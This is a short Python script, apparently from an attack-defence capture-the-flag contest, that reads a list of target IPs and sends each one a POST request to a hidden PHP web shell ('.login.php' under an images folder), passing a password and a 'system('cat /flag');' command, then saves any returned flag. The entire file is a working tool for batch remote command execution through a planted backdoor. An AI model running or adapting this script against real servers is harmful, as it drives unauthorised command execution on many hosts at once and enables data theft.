# -*- coding: utf-8 -*-
# @Author  : Y0n3er
# @Time    : 2023/10/20 19:59
# @blog    : https://y0n3er.github.io/
# @Software: PyCharm
# 拿到shell后直接用这个脚本来拿flag
import requests
from requests.exceptions import Timeout

with open('ip.txt', 'r', encoding='UTF-8') as f:
    for line in f:
        ip = line.strip()  # 使用strip()方法来移除换行符
        print(ip)
        url = 'http://{}/assets/myimages/.login.php'.format(ip) #shell的路径

        data = {
            "passwd": "@@##$QEE741",
            "cmd": "system('cat /flag');"
        }


        try:
            res = requests.post(url=url, data=data, timeout=2)  # 设置连接超时时间
            res.raise_for_status()  # 检查HTTP响应状态
            wre = res.text
            if 'flag' in wre:
                print('获取flag成功 ' + res.text)
                with open('flag.txt', 'a') as flag_file:
                    flag_file.write(wre)
            else:
                print('未能获取flag ' + ip)
        except Timeout:
            print('连接超时，跳过 ' + ip)
        except Exception as e:
            print(f'发生异常: {str(e)}')